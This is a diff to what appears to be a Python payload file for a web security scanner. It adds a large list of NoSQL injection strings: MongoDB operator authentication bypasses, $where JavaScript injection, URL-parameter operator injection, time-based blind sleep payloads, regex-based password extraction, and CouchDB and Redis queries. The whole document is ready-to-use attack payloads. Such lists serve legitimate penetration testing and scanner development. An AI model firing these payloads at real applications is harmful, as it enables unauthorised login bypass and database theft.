@@ -108,7 +108,7 @@ ORACLE_SQLI = [
     "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
 ]
 
-# NoSQL injection payloads
+# NoSQL injection payloads (basic)
 NOSQL_INJECTION = [
     '{"$gt": ""}',
     '{"$ne": ""}',
@@ -121,6 +121,75 @@ NOSQL_INJECTION = [
     "'; return true; var a='",
     "1; return true",
 ]
+
+# Advanced NoSQL injection payloads
+NOSQL_ADVANCED = [
+    # MongoDB operator-based authentication bypass
+    '{"$ne": null}',
+    '{"$gt": ""}',
+    '{"$gte": ""}',
+    '{"$lt": "z"}',
+    '{"$exists": true}',
+    '{"$regex": ".*"}',
+    '{"$regex": "^a"}',
+    '{"$regex": "^admin"}',
+
+    # MongoDB $where clause injection
+    '{"$where": "this.username == \'admin\'"}',
+    '{"$where": "this.password.length > 0"}',
+    '{"$where": "return true"}',
+    '{"$where": "function() { return true; }"}',
+    '{"$where": "this.constructor.constructor(\'return this\')()"}',
+
+    # MongoDB logical operator bypass
+    '{"$or": [{"user":"admin"}, {"pass":""}]}',
+    '{"$or": [{"username":"admin"}, {"username":"root"}]}',
+    '{"$and": [{"$ne": ""}, {"$exists": true}]}',
+    '{"$nor": [{"username": "invalid"}]}',
+
+    # MongoDB array operators
+    '{"user": {"$in": ["admin", "root", "administrator"]}}',
+    '{"user": {"$nin": ["guest"]}}',
+    '{"role": {"$all": ["admin"]}}',
+    '{"$elemMatch": {"user": "admin"}}',
+
+    # NoSQL injection in URL parameters
+    '?filter={"$where":"this.password%20==%20%27test%27"}',
+    '?query={"$gt":""}',
+    '?search[$ne]=',
+    '?user[$regex]=admin',
+    '?id[$ne]=0',
+    '?filter[$or][0][username]=admin&filter[$or][1][password][$ne]=x',
+
+    # MongoDB time-based blind injection
+    '{"$where": "sleep(5000)"}',
+    '{"$where": "function(){sleep(5000);return true;}"}',
+    '{"$where": "(function(){var d=new Date();var c=d.getTime();while(d.getTime()-c<5000){}return true;})()"}',
+
+    # MongoDB blind injection
+    '{"$ne": 1, "admin": 1}',
+    '{"password": {"$regex": "^a.*"}}',
+    '{"password": {"$regex": "^.{8}$"}}',
+
+    # CouchDB specific
+    '{"selector": {"_id": {"$gt": null}}}',
+    '{"selector": {"password": {"$exists": true}}}',
+
+    # Redis-like injection
+    '{"key": "*"}',
+    'KEYS *',
+    'CONFIG GET *',
+
+    # JavaScript injection in NoSQL
+    ';return true;//',
+    '0;return true',
+    "';return(true);'",
+    '1;return true;//',
+    "this.password.match(/.*/)//",
+]
+
+# All NoSQL payloads combined
+ALL_NOSQL_PAYLOADS = NOSQL_INJECTION + NOSQL_ADVANCED
 
 # All payloads combined for comprehensive testing
 ALL_SQLI_PAYLOADS = (
